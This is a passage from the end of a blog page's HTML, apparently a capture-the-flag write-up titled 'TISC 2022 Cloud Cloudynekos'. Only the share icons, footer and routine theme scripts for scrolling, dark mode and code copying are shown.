4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TISC 2022 Cloud Cloudynekos on telegram" href="https://telegram.me/share/url?text=TISC%202022%20Cloud%20Cloudynekos&url=https%3a%2f%2fquentinkhoo.github.io%2fposts%2ftisc-2022-cloud-cloudynekos%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://quentinkhoo.github.io>Quentin</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>